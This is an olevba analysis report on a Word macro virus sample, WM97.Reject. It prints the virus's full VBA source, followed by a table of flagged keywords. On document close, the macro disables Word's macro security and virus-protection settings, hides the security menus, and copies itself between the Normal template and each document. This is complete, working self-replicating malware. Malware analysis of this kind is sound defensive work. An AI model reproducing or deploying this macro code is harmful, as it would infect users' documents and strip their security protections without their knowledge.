olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Reject
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Reject - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = 0
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 Else
   CommandBars("Tools").Controls("Macro").Enabled = 0
   Options.VirusProtection = 0
End If
Set norm = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set doc = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set bug = New DataObject
If norm.lines(Chr(50) + Chr(54), Chr(49)) <> "'AreUHere" Then
    With norm: .DeleteLines Chr(49), .CountOfLines: End With
    bug.SetText doc.lines(Chr(49), doc.CountOfLines): norm.InsertLines Chr(49), bug.GetText(1)
 ElseIf doc.lines(Chr(50) + Chr(54), Chr(49)) <> "'AreUHere" Then
    With doc: .DeleteLines Chr(49), .CountOfLines: End With
    bug.SetText norm.lines(Chr(49), norm.CountOfLines): doc.InsertLines Chr(49), bug.GetText(1)
End If
'WM97.Reject
'For Educational Purposes Only
'[Psyclone X /DVC]
End Sub
'AreUHere
Private Sub Document_New()
On Error Resume Next
Set norm = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set doc = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set bug = New DataObject
If doc.lines(Chr(50) + Chr(54), Chr(49)) <> "'AreUHere" Then
    With doc: .DeleteLines Chr(49), .CountOfLines: End With
    bug.SetText norm.lines(Chr(49), norm.CountOfLines): doc.InsertLines Chr(49), bug.GetText(1)
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

